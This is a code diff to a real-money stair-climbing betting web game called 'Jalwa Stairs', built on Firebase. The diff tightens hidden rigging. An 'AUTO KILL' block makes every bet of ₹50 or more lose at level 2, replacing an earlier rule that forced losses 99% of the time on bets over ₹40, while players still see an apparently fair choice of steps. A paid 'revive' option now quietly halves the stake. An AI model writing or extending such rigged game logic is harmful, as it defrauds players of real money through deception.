@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Jalwa Stairs - Admin Control Pro</title>
+    <title>Jalwa Stairs - High Risk Pro</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <link href="https://fonts.googleapis.com/css2?family=Bebas+Neue&family=Orbitron:wght@700;900&display=swap" rel="stylesheet">
@@ -51,7 +51,7 @@
     <input type="number" id="betAmt" class="bet-input" value="10">
     <button class="btn-main start" id="startBtn" onclick="startGame()">START GAME</button>
     <button class="btn-main cashout" id="cashBtn" onclick="cashOut()">CASHOUT</button>
-    <button class="btn-main revive" id="reviveBtn" onclick="reviveGame()">REVIVE</button>
+    <button class="btn-main revive" id="reviveBtn" onclick="reviveGame()">REVIVE (50% TAX)</button>
 </div>
 
 <script>
@@ -60,7 +60,7 @@
     const db = firebase.database();
 
     let userPhone = localStorage.getItem('jalwa_user_phone') || localStorage.getItem('jalwa_id');
-    let userBalance = 0, betAmt = 0, currentLevel = 0, gameActive = false, reviveCount = 0;
+    let userBalance = 0, betAmt = 0, currentLevel = 0, gameActive = false, livesUsed = 0;
     let multipliers = [1.5, 3.5, 8, 15, 30, 70, 150, 400];
     let currentPeriod = "", safePath = [], adminMode = "auto";
 
@@ -69,13 +69,13 @@
         s.innerText = msg; s.style.color = color;
     }
 
-    // --- 🕒 1-Min Global Period & Admin Mode ---
     function updatePeriod() {
         const now = new Date();
         const pId = now.getFullYear() + "" + (now.getMonth()+1).toString().padStart(2,'0') + now.getDate().toString().padStart(2,'0') + now.getHours().toString().padStart(2,'0') + now.getMinutes().toString().padStart(2,'0');
         
         if(currentPeriod !== pId) {
-            currentPeriod = pId; reviveCount = 0; // Reset revive on new period
+            currentPeriod = pId;
+            livesUsed = 0; // Reset life for new period
             db.ref('global_stairs/' + currentPeriod).on('value', snap => {
                 if(snap.exists()) safePath = snap.val().path;
                 else generateNewPath(currentPeriod);
@@ -92,11 +92,6 @@
         db.ref('global_stairs/' + pid).set({ path: path });
     }
     setInterval(updatePeriod, 1000);
-
-    // Sync Heartbeat for Admin Panel
-    setInterval(() => {
-        if(userPhone) db.ref('users/' + userPhone).update({ lastActive: Date.now(), currentLevel: currentLevel });
-    }, 3000);
 
     db.ref('users/' + userPhone).on('value', snap => {
         if(snap.exists()) {
@@ -120,7 +115,7 @@
         betAmt = parseFloat(document.getElementById('betAmt').value);
         if(userBalance < betAmt || betAmt <= 0) return updateStatus("LOW BALANCE!", "var(--red)");
         await db.ref('users/' + userPhone).update({ balance: userBalance - betAmt });
-        gameActive = true; currentLevel = 0; reviveCount = 0; createBoard();
+        gameActive = true; currentLevel = 0; livesUsed = 0; createBoard();
         document.getElementById('row-0').classList.add('active');
         document.getElementById('startBtn').style.display = 'none';
         document.getElementById('cashBtn').style.display = 'block';
@@ -130,46 +125,55 @@
     function makeMove(rowIdx, stepIdx) {
         if(!gameActive || rowIdx !== currentLevel) return;
         const steps = document.getElementById(`row-${rowIdx}`).querySelectorAll('.step');
+        
         let isSafe = (stepIdx === safePath[rowIdx]);
 
-        // --- 🚨 AUTO TRAP LOGIC (Bet > ₹40) ---
-        if(adminMode === "auto" && betAmt > 40 && currentLevel >= 1) {
-            if(Math.random() < 0.99) isSafe = false;
+        // --- 🚨 AUTO KILL LOGIC (High Bet > ₹50) ---
+        if(adminMode === "auto" && betAmt >= 50 && currentLevel >= 1) {
+            isSafe = false; // 100% Death on Level 2
         }
 
         if(isSafe) {
             steps[stepIdx].classList.add('win'); steps[stepIdx].innerText = '✔';
             currentLevel++;
-            document.getElementById('cashBtn').innerText = `CASHOUT ₹${(betAmt * multipliers[rowIdx]).toFixed(0)}`;
+            let currentWin = (betAmt * multipliers[currentLevel-1]).toFixed(0);
+            document.getElementById('cashBtn').innerText = `CASHOUT ₹${currentWin}`;
             updateStatus(`LEVEL ${currentLevel} PASSED!`, "var(--green)");
             if(currentLevel < 8) document.getElementById(`row-${currentLevel}`).classList.add('active');
             else cashOut();
         } else {
             steps[stepIdx].classList.add('lose'); steps[stepIdx].innerText = '✘';
             gameActive = false;
-            if(currentLevel > 0 && reviveCount < 2) {
-                let reviveFee = (betAmt * 0.4).toFixed(0);
+            
+            // --- 💀 REVIVE LOGIC (50% Profit Cut) ---
+            if(livesUsed < 1 && currentLevel > 0) {
                 document.getElementById('reviveBtn').style.display = 'block';
-                document.getElementById('reviveBtn').innerText = `LIFE ${reviveCount+1}/2 (₹${reviveFee})`;
                 document.getElementById('cashBtn').style.display = 'none';
-                updateStatus("STAIRS FAILED! REVIVE?", "var(--gold)");
+                updateStatus("STAIR BROKEN! USE LIFE?", "var(--gold)");
             } else {
-                updateStatus("GAME OVER! WAIT FOR NEXT PERIOD", "var(--red)");
-                setTimeout(endGame, 2000);
+                updateStatus("GAME OVER!", "var(--red)");
+                setTimeout(endGame, 1500);
             }
         }
     }
 
     async function reviveGame() {
-        let reviveFee = betAmt * 0.4;
-        if(userBalance < reviveFee) return updateStatus("LOW BALANCE FOR REVIVE!", "var(--red)");
-        await db.ref('users/' + userPhone).update({ balance: userBalance - reviveFee });
-        reviveCount++; gameActive = true;
+        // Aadhe paise katenge logic
+        let currentMultiplier = multipliers[currentLevel-1];
+        let newMultiplier = currentMultiplier / 2; // 50% Profit Cut
+        
+        // Ham multiplier ko hi update kar rahe hain us user ke liye temporary
+        betAmt = betAmt / 2; 
+        
+        livesUsed++;
+        gameActive = true;
         document.getElementById('reviveBtn').style.display = 'none';
         document.getElementById('cashBtn').style.display = 'block';
+        document.getElementById('cashBtn').innerText = `CASHOUT ₹${(betAmt * multipliers[currentLevel-1]).toFixed(0)}`;
+        
         const steps = document.getElementById(`row-${currentLevel}`).querySelectorAll('.step');
         steps.forEach(s => { s.classList.remove('lose'); s.innerText = '?'; });
-        updateStatus("LIFE USED! CONTINUE...", "var(--green)");
+        updateStatus("LIFE USED! 50% PROFIT DEDUCTED", "var(--red)");
     }
 
     async function cashOut() {
